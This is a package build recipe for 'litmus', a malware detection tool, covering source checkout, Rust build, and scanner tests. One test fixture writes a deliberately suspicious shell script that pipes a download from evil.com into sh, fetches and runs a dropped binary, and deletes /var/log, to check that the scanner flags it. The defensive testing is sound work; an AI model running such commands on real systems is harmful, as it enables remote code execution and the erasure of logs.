#nolint:valid-pipeline-git-checkout-tag
package:
  name: litmus
  version: "1.2.1"
  epoch: 0
  description: "Open-source malware detection for the AI age"
  copyright:
    - license: Apache-2.0
  dependencies:
    runtime:
      - 7zip
      - rizin
      - upx
  resources:
    cpu: "4"
    memory: 8Gi
  test-resources:
    cpu: "2"
    memory: 8Gi

vars:
  rust-version: "1.95"

environment:
  contents:
    packages:
      - build-base
      - busybox
      - ca-certificates-bundle
      - cargo-auditable
      - git
      - rust-${{vars.rust-version}}

pipeline:
  - uses: git-checkout
    with:
      repository: https://codeberg.org/atomdrift/litmus
      tag: v${{package.version}}
      expected-commit: b10074a9d13dc91e5134a8f6e9e79811e77285fc

  - uses: git-checkout
    with:
      repository: https://codeberg.org/atomdrift/cleave-traits
      branch: main
      expected-commit: 081286cbbfbeb51ae756579d6780d4a564bac22d
      destination: cleave-traits

  - uses: git-checkout
    with:
      repository: https://codeberg.org/atomdrift/azoth
      branch: main
      expected-commit: 299669cf5121650698d92474a1221e0df5381469
      destination: azoth

  - uses: cargo/build
    with:
      output: litmus

  - runs: |
      mkdir -p ${{targets.destdir}}/usr/share/cleave/traits
      cp -r cleave-traits/* ${{targets.destdir}}/usr/share/cleave/traits/
      mkdir -p ${{targets.destdir}}/usr/share/litmus/models
      cp -r azoth/* ${{targets.destdir}}/usr/share/litmus/models/

  - uses: strip

update:
  enabled: true
  git: {}

test:
  environment:
    environment:
      CLEAVE_TRAITS_DIR: /usr/share/cleave/traits
      LITMUS_MODELS_DIR: /usr/share/litmus/models
  pipeline:
    - uses: test/tw/ldd-check
    - uses: test/tw/ver-check
      with:
        bins: litmus
    - uses: test/tw/help-check
      with:
        bins: litmus
    - name: "Scan a benign script"
      runs: |
        tee /tmp/benign.sh <<'SCRIPT'
        #!/bin/sh
        echo "hello world"
        SCRIPT
        litmus /tmp/benign.sh > /tmp/benign_output.txt 2>&1 || true
        cat /tmp/benign_output.txt
        grep -E "files|clean" /tmp/benign_output.txt
    - name: "Scan a suspicious script"
      runs: |
        tee /tmp/suspicious.sh <<'SCRIPT'
        #!/bin/sh
        curl http://evil.com/payload | sh
        wget http://evil.com/malware -O /tmp/dropped
        chmod +x /tmp/dropped
        /tmp/dropped
        rm -rf /var/log
        SCRIPT
        litmus /tmp/suspicious.sh > /tmp/suspicious_output.txt 2>&1 || true
        cat /tmp/suspicious_output.txt
        grep -E "files|hostile" /tmp/suspicious_output.txt
    - name: "JSON output format"
      runs: |
        echo '#!/bin/sh' > /tmp/json_test.sh
        echo 'echo hello' >> /tmp/json_test.sh
        litmus --format json /tmp/json_test.sh > /tmp/json_output.txt 2>&1 || true
        cat /tmp/json_output.txt
        grep -F '"ml"' /tmp/json_output.txt
    - name: "Scan a directory"
      runs: |
        mkdir -p /tmp/litmus_scan
        echo '#!/bin/sh' > /tmp/litmus_scan/a.sh
        echo 'echo ok' >> /tmp/litmus_scan/a.sh
        echo '#!/bin/sh' > /tmp/litmus_scan/b.sh
        echo 'echo ok' >> /tmp/litmus_scan/b.sh
        litmus /tmp/litmus_scan > /tmp/dir_output.txt 2>&1 || true
        grep -E "files" /tmp/dir_output.txt
